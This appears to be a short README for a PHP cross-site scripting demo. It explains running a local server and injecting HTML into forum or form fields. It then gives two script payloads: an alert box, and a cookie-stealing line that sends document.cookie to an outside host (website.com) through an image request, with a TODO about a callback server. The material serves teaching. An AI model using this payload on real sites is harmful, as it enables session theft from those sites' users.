# Quick demo
- Just an example of XSS with php

## Run
- Run with `php -S localhost:8000`
- `tail -f /var/log/httpd/access_log`

## PHP
- PHP is a server side scripting language.
- That means that it runs code you can't see before sending you back a resopnse
- This is called a backend or server and this is how *modern* websites work.

## Exploit
- Tags into forms for forums, email signature, etc...
```html
I'm <strong>STRONG</strong>!
```
- If you can put in tags, that means you can put in `<script>` tags...

**TODO: simplehttpserver as callback**
- Either of the forms with
```html
<script>alert('doot')</script>
<script>document.write('<img src="http://website.com/?cookie=' + document.cookie + '" />')</script>
```
